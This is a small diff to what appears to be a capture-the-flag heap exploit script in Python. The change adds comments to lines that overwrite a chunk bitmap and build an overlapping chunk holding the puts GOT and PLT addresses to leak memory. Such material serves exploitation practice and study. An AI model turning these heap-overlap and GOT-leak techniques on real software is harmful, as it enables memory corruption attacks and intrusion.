@@ -27,8 +27,8 @@ def dele(idx):
 puts = 0x4007e0
 puts_got = 0x000000000603260
 add(2014,"orange")
-add(2014,"nogg")
-add(2046,p64(0) + p64(0x7de) + p64(puts_got) + p64(puts))
+add(2014,"nogg") #overwrite the bitmap
+add(2046,p64(0) + p64(0x7de) + p64(puts_got) + p64(puts)) # overlap 
 r.sendline("2")
 r.recvuntil("1. ")
 r.recvuntil("1. ")
